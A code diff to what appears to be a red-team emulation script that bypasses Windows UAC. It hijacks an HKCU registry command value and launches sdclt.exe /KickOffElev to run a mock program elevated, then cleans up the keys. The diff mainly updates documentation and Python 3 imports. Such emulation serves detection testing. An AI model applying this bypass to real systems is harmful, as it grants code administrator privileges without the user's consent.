@@ -1,17 +1,21 @@
-# Name: Bypass UAC via Sdclt
-# rta: uac_sdclt.py
-# ATT&CK: T1088
-# Description: Modifies the Registry to auto-elevate and execute mock malware.
+"""
+Name: Bypass UAC via Sdclt
+RTA: uac_sdclt.py
+ATT&CK: T1088
+Description:
+The uac_sdclt.py script modifies the Registry to auto-elevate and execute mock malware by leveraging the
+`sdclt.exe` utility. This technique can be used to bypass User Account Control (UAC).
+Key Features:
+- UAC Bypass: Alters the registry to enable running applications without UAC prompts.
+- Execution of Mock Malware: Executes a specified application using `sdclt.exe` with elevated privileges.
+- Windows-Specific: This script modifies the Windows registry and should only run on Windows systems.
+"""
 
 import subprocess
 import sys
 import os
-import _winreg as winreg
+import winreg as winreg
 import common
-
-# HKCU:\Software\Classes\exefile\shell\runas\command value: IsolatedCommand
-# "sdclt.exe /KickOffElev" or children of sdclt.exe
-# HKLM value: "%1" %*
 
 
 def main(target_process=common.get_path("bin", "myapp.exe")):
@@ -25,13 +29,12 @@ def main(target_process=common.get_path("bin", "myapp.exe")):
     winreg.SetValueEx(hkey, key_name, 0, winreg.REG_SZ, target_process)
 
     common.log("Running Sdclt to bypass UAC")
-    common.execute([r"c:\windows\system32\sdclt.exe", "/KickOffElev"])
-    
+    common.execute([r"c:\\windows\\system32\\sdclt.exe", "/KickOffElev"])
+
     common.log("Clearing registry keys", log_type="-")
     winreg.DeleteValue(hkey, "IsolatedCommand")
     winreg.DeleteKey(hkey, "")
     winreg.CloseKey(hkey)
-
 
 
 if __name__ == "__main__":
